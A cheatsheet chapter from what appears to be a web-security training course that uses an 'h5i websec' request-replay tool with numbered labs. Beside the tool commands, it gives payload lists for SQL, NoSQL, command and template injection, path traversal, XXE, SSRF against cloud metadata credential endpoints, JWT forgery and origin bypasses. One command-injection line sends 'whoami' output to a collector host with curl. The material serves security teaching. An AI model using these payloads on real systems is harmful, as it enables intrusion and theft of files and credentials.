# 3. Cheatsheet

One page. Print it, or keep it open beside the labs.

---

## 3.1 The loop

```bash
h5i browser open URL --session s --new --capture     # 1. capture
h5i websec requests --session s --human              # 2. read the record
h5i websec show res_0 --session s --raw              #    read one message
h5i websec replay req_0 --session s --set TARGET=V   # 3. change one thing
h5i websec diff res_0 res_1 --session s --human      # 4. compare
h5i websec match res_1 --session s --contains X      #    assert (exit 0/1/2)
h5i browser close --session s
```

Body of a replay's answer, in two calls:

```bash
SEQ=$(h5i websec replay req_0 --session s --set … | jq -r .seq)
h5i websec show "res_$SEQ" --session s --raw
```

---

## 3.2 `--set` targets

```
method=POST                       url=http://other/x        path=/admin
query.<name>=                     header.<name>=            cookie.<name>=
json.<a.b.0.c>=                   form.<name>=              body.raw=
multipart.<part>=                 multipart.<part>.filename=
multipart.<part>.content-type=
```

* value = everything after the **first** `=`
* a value that parses as JSON is sent as JSON: `json.admin=true` (boolean),
  `json.p={"$gt":""}` (object), `json.t=["a"]` (array), `json.admin="true"` (string)
* `--create` to add, `--unset` to remove, `--set-file T=PATH` for bytes

## 3.3 Replay flags

```
--create           add a target that is not there
--set-file T=PATH  the value is the file's bytes (images, polyglots)
--as SESSION       send from another session's jar        [Lab 08]
--keep-credentials carry Cookie/Authorization with --as
--repeat N         N sends, with median + MAD timing      [Lab 14]
--race             release the repeats together           [Lab 35]
--no-follow        stop at the redirect and report it     [Lab 24]
--reset-budget     restart the page allowance — USE IN LOOPS [Lab 06]
--raw-target T     request-target byte for byte           [Lab 27]
--raw-request F    whole message byte for byte            [Lab 30]
```

## 3.4 Other verbs

```
h5i websec requests --method/--status/--url-contains/--initiator/--denied-only/--limit
h5i websec show ID --raw | --body-to PATH
h5i websec sitemap
h5i websec match ID --status/--contains/--regex/--json-path/--header/--longer-than/--shorter-than
h5i websec sequence FILE --var N=V [--keep-going]         [Lab 41]
h5i websec socket ws://… --send FRAME --wait-ms MS        [Lab 34]
h5i browser requests            # includes what policy DENIED
h5i browser snapshot | markdown | click @e3 | type @e5 "x" | navigate URL
```

---

## 3.5 Probe values, by class

**Injection canaries** (send once per parameter; watch status, size, time):

```
'    "    \    `    ;    |    &    <    >    ${7*7}    {{7*7}}    ../    %00
```

**SQL** — [Labs 12–14, 19]

```
'                          break it
' AND '1'='1  /  '1'='2    prove the logic changed
' ORDER BY 3 --            count columns
' UNION SELECT 1,2,3 --    read
' AND (SELECT unicode(substr(x,1,1)) FROM t) > 77 --      boolean oracle
' OR (SELECT CASE WHEN (…) THEN sleep(1) ELSE 0 END) --   timing oracle
schema: sqlite_master | information_schema.tables | pg_tables | sys.tables
comment: `-- ` (with the space) | # | /**/
```

**NoSQL / type confusion** — [Labs 09, 15]

```
{"$gt": ""}   {"$ne": null}   {"$regex": "^a"}   {"$in": [...]}
?p[$ne]=1      ?a[]=x&a[]=y      true vs "true"      1 vs "1"
```

**Command** — [Labs 16, 34]

```
; id      | id      && id      $(id)      `id`      %0a id
${IFS} for spaces      {cat,/etc/passwd}      c''at
close the quote first:  x'; id; echo '
blind: ; sleep 5;   |   ; curl http://collector/$(whoami);
```

**Template (SSTI)** — [Labs 17, 29]

```
{{7*7}}  {{7*'7'}}  ${7*7}  #{7*7}  <%= 7*7 %>
python: obj.__init__.__globals__["SECRET"]
        ''.__class__.__mro__[1].__subclasses__()
jinja:  {{ cycler.__init__.__globals__.os.popen('id').read() }}  {{ config }}
```

**Traversal / LFI** — [Labs 27, 29]

```
../  ..%2f  %2e%2e%2f  %252e%252e%252f  ..%c0%af  ....//
targets: /etc/passwd  /proc/self/environ  /proc/self/cmdline  access.log  .env
--raw-target when the encoding IS the payload
```

**XXE** — [Lab 18]

```xml
<!DOCTYPE r [ <!ENTITY x SYSTEM "file:///etc/passwd"> ]><r>&x;</r>
blind: parameter entity + external DTD on your host
```

**SSRF** — [Labs 25, 26]

```
127.0.0.1 → 2130706433 | 0x7f000001 | 017700000001 | 127.1 | 0 | [::1]
169.254.169.254/latest/meta-data/iam/security-credentials/
metadata.google.internal/computeMetadata/v1/  (+ Metadata-Flavor: Google)
also: file:// gopher:// dict://, a redirect you control, DNS rebinding
```

**JWT** — [Labs 10, 11]

```
alg: none (trailing dot)   |  crack a weak HS256 secret
RS256→HS256 (public key as the HMAC key)
kid: ../static/known.txt   |  jku/x5u pointing at your JWKS
missing exp / iss / aud checks
```

**Serialisation** — [Lab 40]

```
\x80\x04  pickle      rO0AB / \xac\xed  Java      O:8:"  a:2:{  PHP
AAEAAAD/////  .NET      !!python/object/apply:  YAML   {"$type":  Json.NET
```

**Origin / redirect validation** — [Labs 23, 24]

```
https://ok.example.evil.test        prefix check
https://evilok.example              suffix check
https://evil.test/?x=ok.example     substring check
https://ok.example@evil.test        userinfo
//evil.test    http://ok.example:9999    Origin: null
an open redirect ON the allowed origin
```

**Headers worth sweeping** — [Labs 23, 29, 32, 33]

```
Host  X-Forwarded-Host  X-Forwarded-For  X-Forwarded-Proto  X-Original-URL
X-Rewrite-URL  Origin  Referer  User-Agent  True-Client-IP  Via  X-Api-Version
```

**Mass-assignment field names** — [Lab 09]

```
is_admin isAdmin admin role roles is_staff is_superuser verified confirmed
active enabled credits balance quota plan tier owner_id user_id tenant_id
organization_id id uuid password_hash mfa_enabled
```

**CRLF** — [Lab 31] carry real bytes: `$'\r\n'` in a JSON field, or
`--raw-target` / `--raw-request`. End the header block (`\r\n\r\n`) rather
than fighting duplicate-header precedence.

---

## 3.6 The four questions for any endpoint

1. **Who** — replay it as every other actor (`--as`, no credential at all)
2. **What** — change every identifier, and every field's *type*
3. **How** — change the method, the `Content-Type`, the path's spelling, the API version
4. **When** — send it twice, send it out of order, send twenty at once (`--race`)

---

## 3.7 Reading a sweep

```bash
for v in …; do
  h5i websec replay req_0 --session s --reset-budget --set query.x="$v" |
    python3 -c 'import json,sys;r=json.load(sys.stdin);s=r["response"]
print(s["status"], s["bytes"], r["samples"][0]["total_ms"])'
done | sort | uniq -c
```

Status, size, time. The outlier is the finding.

---

## 3.8 When something does not work

```
payload had no effect      →  websec show req_N --raw   (did it leave as written?)
everything returns the same →  h5i browser requests     (did policy refuse it?)
a loop goes quiet          →  --reset-budget
--set refused              →  --create
a value became a string    →  it did not parse as JSON — check the quoting
% got re-encoded           →  --raw-target
framing headers rewritten  →  --raw-request
a page script did nothing  →  --script on the session
a socket said nothing      →  raise --wait-ms
```

Next: [`04-reporting-and-scope.md`](04-reporting-and-scope.md).
